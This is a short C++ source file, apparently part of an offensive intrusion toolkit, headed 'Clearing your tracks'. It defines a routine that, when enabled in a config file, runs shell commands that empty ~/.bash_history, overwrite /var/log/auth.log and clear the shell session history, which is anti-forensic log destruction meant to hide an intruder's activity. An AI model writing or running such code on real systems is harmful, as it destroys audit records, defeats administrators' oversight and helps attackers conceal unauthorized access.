#include "../modules/executils.h"
#include "../modules/parsers.h"
#include <algorithm>


// Clearing your tracks

struct ClearLogs {
    std::string clearBash = "echo '' > ~/.bash_history";
    std::string clearAuth = "echo '' > /var/log/auth.log";
    std::string clearSession = "history -c";

    void clear() {
        execCommand(clearBash);
        execCommand(clearAuth);
        execCommand(clearSession);
    }
};

void clearTracks() {
    ClearLogs logs; 
    std::vector<std::string> echo = parseDependencies("config/shadow.conf", "optional");
    std::vector<std::string> clear = parseDependencies("config/shadow.conf", "clear");
    if (find(clear.begin(), clear.end(), "yes") != clear.end()) {
        for (const auto& cmd : echo) {
            if (commandExists("echo") && cmd == "echo") {
                logs.clear();
            }
        }
    }
}
